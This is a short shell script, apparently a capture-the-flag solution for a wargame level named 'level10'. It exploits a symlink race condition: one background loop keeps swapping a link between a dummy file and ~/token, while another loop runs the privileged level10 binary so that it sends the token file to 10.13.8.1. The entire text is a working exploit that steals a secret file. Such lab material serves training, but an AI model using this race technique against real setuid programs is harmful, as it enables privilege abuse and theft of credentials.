touch /tmp/level10/tmp
chmod 755 /tmp/level10/tmp

sh -c "while true; do ln -fs /tmp/level10/tmp /tmp/level10/ok; ln -fs ~/token /tmp/level10/ok; done" &

while true; do ~/level10 /tmp/level10/ok 10.13.8.1; done
